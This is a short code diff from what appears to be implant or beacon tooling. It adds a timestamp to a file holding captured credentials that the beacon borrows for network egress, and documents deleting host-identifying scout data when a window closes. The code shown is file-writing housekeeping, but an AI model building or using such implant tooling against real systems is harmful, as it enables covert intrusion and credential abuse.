@@ -28,7 +28,9 @@ Five files, and which side owns each:
     way_out_scout.json      the scout writes, the beacon reads.  The
                             evidence from the tap, the rungs the scout
                             believes are available, and -- in the model
-                            stage -- one recommendation.
+                            stage -- one recommendation.  Removed when
+                            the window closes: it names the host's MAC,
+                            its IP, its proxies and its resolvers.
     way_out_trail.jsonl     the beacon writes, nobody here reads.  One
                             line per attempt, kept after the state file is
                             gone, which is what makes a burned implant a
@@ -56,6 +58,7 @@ import logging
 import os
 import stat
 import tempfile
+import time
 from typing import Optional
 
 logger = logging.getLogger("raccoon.scout.handoff")
@@ -172,8 +175,17 @@ def write_document(state_dir: str, document: dict) -> None:
 
 
 def write_borrow(state_dir: str, fields: dict) -> None:
+    """The private half, stamped with when it was written.
+
+    The stamp is what lets `Beacon._egress_borrow` tell a credential
+    captured in *this* outage from one left behind by a previous one. The
+    scout removes this file when a window closes, so the only way a stale
+    one survives is a scout that died -- and then there is no fresh
+    document either, and nothing else to notice with.
+    """
     write_private_json(borrow_path(state_dir),
-                       dict(fields, version=BORROW_VERSION))
+                       dict(fields, version=BORROW_VERSION,
+                            written=time.time()))
 
 
 def write_private_json(path: str, document: dict) -> None:
